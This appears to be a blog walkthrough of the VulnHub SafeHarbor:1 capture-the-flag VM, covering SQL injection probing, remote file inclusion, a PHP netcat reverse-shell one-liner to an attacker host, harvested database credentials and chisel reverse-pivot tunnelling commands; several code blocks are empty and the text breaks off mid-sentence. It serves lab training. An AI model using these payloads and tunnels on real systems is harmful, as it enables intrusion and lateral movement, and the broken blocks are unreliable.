title: VulnHub Walkthrough SafeHarbor:1 
published: true
---

I enjoyed playing this challenge and I thought it would be a great idea to write a walkthrough. Even though most of the techniques required to solve the challenges were well known I tried to use non-traditional paths to some extent. I limited myself from using Metasploit or Cobalt Strike, which are often easily detected during red team engagements. So the goal was to use tools and scripts, that I often bookmarked and read about.

If you want to play along, you can download the VM from Vulnhub here: [SafeHarbor:1](https://www.vulnhub.com/entry/safeharbor-1,377/)

**Description from VulnHub:**

```
A harder VM designed to train for both pentesting newer IT infrastructure methodologies as well as network pivot practice.
You'll need to be familiar with pivoting techniques, web app vulnerabilities, Metasploit and Meterpreter, as well as enumeration methodologies and a good bit of patience.
As a note, there are two additional bonus flags that will appear in the /root directory based on pre-defined actions taken during the course of rooting the VM.
Works better in VirtualBox than VMware
```

As mentioned in the description the VM works well on VirtualBox, I tried Vmware Fusion and DHCP does not seem to work. Once you have the VM up and running, discover the live hosts in your vmnet adapter to find the VM IP address (not covered in this post)

**Service discovery scan:**

Scanning well known ports gives me something to start with, the attack surface is limited to port 80 running a PHP application and SSH service. Let's go ahead and take a look at the application.

In the meantime, let's also look for common PHP files using wfuzz. This is much faster than using dirbuster in my opinion.

```sh
wfuzz -c --hc 404 -z file,/tmp/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://192.168.1.21/FUZZ.php -t 500
```

Sweet! it's a login page. 

![login_page](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.png)

Let's quickly try some SQL injections on the login form fields:

```
POST / HTTP/1.1
Host: 192.168.1.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0

user=';--&password=test&s=Login
```

From the verbose errors, we can deduce that SQL injection is possible, I'm going to try some standard login bypass technique.

![sqli_error](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.png)

```sql

```

```

Et voil√†! That was easy, considering this was trivial I probably have a longer path to get all the flags.

Let's take a look at the wfuzz output:

```sh

Settings in phpinfo.php reveals that the directives for including files are enabled. Let's try LFI/RFI, if that doesn't work I can maybe exploit further using PHP streams.

```
Registered PHP Streams:  https, ftps, compress.zlib, php, file, glob, data, http, ftp, phar

Directive:
allow_url_fopen On  On
allow_url_include On  On

```

A quick test reveals that the parameter "p" uses include function: http://192.168.1.21/OnlineBanking/index.php?p=../../../balance

```html
<br />
<b>Warning</b>:  include(../../../balance.php): failed to open stream: No such file or directory in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../balance.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/OnlineBanking/index.php</b> on line <b>13</b><br />

```

Let me host a PHP file on my Kali (attacker) box to execute the command 'id' and include the remote file to see if that works. 

```php
<?php system('id'); ?>
```

Start a web server using Python's SimpleHTTPServer:

```sh
root@kali:/tmp# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

That worked!

![command_execution](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.png)


Let's go ahead and get a reverse shell, using the default one available on Kali (/usr/share/webshells/php/php-reverse-shell.php) or you can achieve the same using a one liner shown below. I did some basic checks to verify what shells are available and if netcat is available. Luckily, the version supports "-e" option. If that option is not supported you can use the workaround mentioned here: [Link to another page](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)

```php
<?php system('nc attacker_ip port -e /bin/sh'); ?>
```

Great! Now I have a reverse shell:

![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_1.gif)

What should I be looking for next? Maybe check the PHP files to see if there are any secrets or hard-coded credentials.

```php
cat balance.php
<?php
session_start();

if(is_null($_SESSION["loggedin"])){
  header("Location: /");
}


$dbServer = mysqli_connect('mysql', 'root', 'TestPass123!', 'HarborBankUsers');
$user = $_SESSION["username"];
$balanceQueryResult = mysqli_query($dbServer, "SELECT balance FROM users WHERE username = '$user'");
$balanceRow = mysqli_fetch_row($balanceQueryResult);
$balance = $balanceRow[0];
?>

```

Yay! found the MySQL credentials. So where are the other backend components since I found only one interface. Let's take a look at the cheatsheet and see if we missed anything [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

```
Platform/software specific tests:
Checks to determine if we're in a Docker container
```

After looking up on how to determine that, thanks to this post on [StackOverflow](https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container)

This comes as no surprise, but verify first :-)

Alright, let me simply do an arp scan to find the neighbours:

```sh
arp -a

```

**Privilege escalation? No! Let's just ~~pivot~~ reverse pivot:**

How do I tunnel my traffic through the host VM? I could open a listening port on the docker container but the host VM would not let my traffic through (like corporate firewalls? :-/) I could very well use a meterpreter PHP payload and let metasploit handle the proxying for me. But I said I would try new tools and techniques to solve this challenge.

I have illustrated the current situation below, not to be treated as a network diagram!

```
         :22 |<--->               [HOST VM]                                     |
Perimeter/   |         80:[Docker Container running PHP]:(higher order port --->| 8000:[Attacker Machine]
Outside  :80 |<--->                                      reverse connect)       |
             |                     ^                                            |
             |                     |                                            |
             |                     |                                            |
             |                     v                                            |
             |           [Docker Container running MySQL]:3306                  |
             |                                                                  |
```

During real world red team engagements we are often faced with challenges like this, there is no SSH or firewall restricts all inbound connections except for web ports (80 or 443). We have to heavily rely on reverse connections, and that's why we will be using reverse pivot! The victim machine (client) will connect back (reverse) to the attacker machine (server) and then open a tunnel to route the traffic to the destination server(MySQL) and port. 

There are quite a lot of tools that comes to my mind for such a situation. Listing them below for your reference:

* [3proxy](https://github.com/z3APA3A/3proxy)
* [rpivot](https://github.com/klsecservices/rpivot)
* [reGeorg](https://github.com/sensepost/reGeorg)

Out of these I chose to go with [Chisel](https://github.com/jpillora/chisel#socks5-guide), mainly because of it's simplicity, written in golang and it can be cross-compiled. Also, there are other features that I am interested in.

Let me illustrate this here:

```

```

``

``

**On the victim machine run:**

```sh
./chisel client 192.168.1.22:8888 R:9999:172.20.0.138:3306
```

```

![chisel_listening_server](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_3.gif)

Now, let's go ahead and connect to MySQL and see what's in the database for us:

![mysql_connect](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_2.gif)


I spent quite a lot of time reading the chisel manual page and when I checked the open issues for the project "reverse proxy" is a feature request. Unfortunately, the chisel client does not support socks5 server (I mean, makes sense it's a client right?)

What we did earlier was reverse connect the docker container to our attacker machine and tunnel traffic for a specific port. For us to expand our attack surface and laterally move I would need a socks proxy or something similiar.

Reading through the open issues, a comment from one of the user shows a complicated way of making this happen, here's the link to the page: https://github.com/jpillora/chisel/issues/101

**On the (Kali) attacker machine run:**

```sh
./chisel_linux_amd64 server -p 9000 --reverse -v
```

**On the victim machine run:**

```sh
./chisel client -v http://192.168.1.22:9000 R:127.0.0.1:14000:127.0.0.1:18000 &
./chisel server -p 62000 --host 127.0.0.1 --socks5 -v &
./chisel client -v http://127.0.0.1:62000 127.0.0.1:18000:socks &
```

![chisel_socks_1](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_6.png)

Here's the background of what we performed in the above steps.

- [Docker container] reverse connects to [Kali VM] on port 9000
- chisel client [Docker container] tunnels traffic between [Kali VM] 14000 and [Docker container] 18000
- chisel server [Docker container] creates socks5 server on port 62000
- chisel client [Docker container] tunnels traffic between port 18000 and socks5 proxy listening on [Docker container] 62000
- This creates a socks5 proxy between [Kali VM] and [Docker container] R:127.0.0.1:1:14000=>127.0.0.1:18000 (R indicates remote)

```
[Docker container]--> reverse connect 9000:[Kali VM]:14000 <==> [Docker container] chisel-client 127.0.0.1:18000 ==> [Docker container] socks5 127.0.0.1:62000
```

On the Kali machine you should see the connection established:

![chisel_socks_2](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_7.png)

Phew! That was a bit complex but let's see if the socks proxy works. Let's check if 

```
root@kali:~# netstat -antp | grep 14000
tcp        0      0 127.0.0.1:14000         0.0.0.0:*               LISTEN      8203/./chisel_linux 
```

Port 14000 has opened up on my Kali machine, let me add it to the proxychains configuration file to use that as my socks5 proxy. If this works, I should be able to use proxychains to continue moving laterally.


```
root@kali:~# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 14000
localnet 127.0.0.1 000 255.255.255.255
```
Quickly testing the socks5 proxy connectivity, let's do a curl on the target web server and a quick full TCP scan for port 80 on limited hosts.

![reverse_shell_gif](assets/Vulnhub-walkthrough-safeharbor1/Vulnhub-walkthrough-safeharbor1_4.gif)

Let's go ahead and run a full TCP port scan on using Metasploit with proxychains:
